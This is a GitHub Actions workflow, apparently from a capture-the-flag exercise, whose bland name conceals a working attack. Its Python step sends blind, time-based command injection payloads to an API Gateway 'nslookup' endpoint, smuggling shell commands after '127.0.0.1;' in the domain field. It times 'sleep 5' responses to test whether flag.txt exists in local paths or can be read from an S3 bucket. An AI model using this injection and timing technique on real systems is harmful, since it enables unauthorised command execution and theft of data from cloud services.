name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Path and Method Discovery Timing Test
        run: |
          python3 << 'PYEOF'
          import subprocess
          import json
          import time

          API_ID = "3q931syi7b"
          REGION = "us-east-1"
          URL = f"https://{API_ID}.execute-api.{REGION}.amazonaws.com/dev/nslookup"

          # Test different locations and methods to see which one triggers the sleep (>= 4.5s)
          tests = [
              ("Local /var/task/flag.txt", '[ -f /var/task/flag.txt ] && sleep 5'),
              ("Local /tmp/flag.txt", '[ -f /tmp/flag.txt ] && sleep 5'),
              ("Local root flag.txt", '[ -f /flag.txt ] && sleep 5'),
              ("Python S3 read via boto3", 'python3 -c "import boto3; s3=boto3.client(\'s3\'); obj=s3.get_object(Bucket=\'codec4f26c862a321ef5\', Key=\'flag.txt\'); print(obj[\'Body\'].read())" && sleep 5'),
              ("AWS CLI S3 cp current dir", 'aws s3 cp s3://codec4f26c862a321ef5/flag.txt ./flag.txt --region us-east-1 && [ -f ./flag.txt ] && sleep 5')
          ]

          for name, cmd in tests:
              print(f"Testing: {name}...", end=" ", flush=True)
              domain = f"127.0.0.1; {cmd}"
              payload = json.dumps({"domain": domain})
              
              start = time.time()
              try:
                  res = subprocess.run(
                      ["curl", "-s", "--max-time", "6", "-X", "POST", URL,
                       "-H", "Content-Type: application/json", "-d", payload],
                      capture_output=True, text=True, timeout=10
                  )
                  elapsed = time.time() - start
              except subprocess.TimeoutExpired:
                  elapsed = 10

              if elapsed >= 4.5:
                  print(f"MATCH FOUND! (Took {elapsed:.2f}s)")
              else:
                  print(f"No match (Took {elapsed:.2f}s)")

          PYEOF
